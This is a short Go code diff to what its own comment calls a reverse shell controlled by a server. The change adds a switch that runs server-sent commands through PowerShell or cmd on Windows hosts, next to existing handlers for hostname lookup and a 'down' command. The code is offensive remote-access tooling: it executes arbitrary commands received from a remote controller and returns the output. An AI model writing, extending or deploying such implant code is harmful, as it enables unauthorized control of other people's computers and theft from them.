@@ -24,6 +24,7 @@ func ls(path string) string {
 
 // shell is the reverse shell which is controlled by the server
 func (c *connection) shell() {
+	var powershell bool
 	for {
 		cmdbyte, err := c.recv()
 		if err != nil {
@@ -36,6 +37,16 @@ func (c *connection) shell() {
 		out := true
 
 		switch cmdsp[0] {
+		case "powershell":
+			if runtime.GOOS == "windows"{
+				powershell = true
+				output = []byte("Shell is now Powershell")
+			}
+		case "cmd":
+			if runtime.GOOS == "windows"{
+				powershell = false
+				output = []byte("Shell is now Cmd")
+			}
 		case "hostname":
 			output = crypto.GetHostname(HostnamePath)
 		case "down":
@@ -97,7 +108,7 @@ func (c *connection) shell() {
 			output = []byte(strings.Join(files, " "))
 
 		default:
-			output = runCmd(cmd, false)
+			output = runCmd(cmd, powershell)
 		}
 		if output == nil && out {
 			c.sendSt("No output something potentially went wrong!")
